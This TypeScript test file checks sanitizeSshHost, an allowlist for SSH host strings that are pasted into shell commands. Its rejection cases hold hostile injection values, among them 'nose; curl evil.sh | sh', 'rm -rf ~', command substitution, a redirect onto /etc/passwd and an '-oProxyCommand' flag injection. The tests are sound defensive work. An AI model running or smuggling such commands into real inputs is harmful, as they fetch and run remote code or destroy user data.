import { describe, test, expect } from "bun:test";
import { sanitizeSshHost } from "./devices";

// This value is concatenated into a shell command the user is invited to paste
// into their own terminal, so the allowlist is the whole security story. These
// tests are the allowlist's specification.
describe("sanitizeSshHost", () => {
  test("accepts the shapes a real ssh target takes", () => {
    for (const ok of [
      "nose",
      "jb-m5-max",
      "host.example.com",
      "m1@10.0.0.4",
      "ec2-user@mac-mini.local",
      "10.0.0.4",
      "[fe80::1]",
      "user_name@host",
    ]) {
      expect(sanitizeSshHost(ok)).toBe(ok);
    }
  });

  test("trims surrounding whitespace", () => {
    expect(sanitizeSshHost("  nose \n")).toBe("nose");
  });

  test("empty input means 'no target', not an error", () => {
    expect(sanitizeSshHost("")).toBeNull();
    expect(sanitizeSshHost("   ")).toBeNull();
    expect(sanitizeSshHost(undefined)).toBeNull();
    expect(sanitizeSshHost(null)).toBeNull();
  });

  // Each of these would otherwise let the copied line do something other than
  // what it reads as — the exact failure the allowlist exists to prevent.
  test("rejects anything that could end the argument or chain a command", () => {
    for (const bad of [
      'nose" ; rm -rf ~',       // close the outer quote, then a new command
      "nose'",                   // close the inner pane quote
      "nose; curl evil.sh | sh", // command separator
      "nose && whoami",          // conditional chain
      "nose | tee /tmp/x",       // pipe
      "nose $(whoami)",          // command substitution
      "nose `whoami`",           // legacy substitution
      "nose\nrm -rf ~",          // newline = a second command line
      "nose > /etc/passwd",      // redirect
      "a b",                     // a bare space splits argv
      "nose#comment",
      "nose\\",
    ]) {
      expect(sanitizeSshHost(bad)).toBeNull();
    }
  });

  test("rejects a leading dash, which ssh would read as a flag", () => {
    expect(sanitizeSshHost("-oProxyCommand=touch~x")).toBeNull();
    expect(sanitizeSshHost("-nose")).toBeNull();
  });

  test("rejects absurdly long input", () => {
    expect(sanitizeSshHost("a".repeat(129))).toBeNull();
    expect(sanitizeSshHost("a".repeat(128))).toBe("a".repeat(128));
  });
});
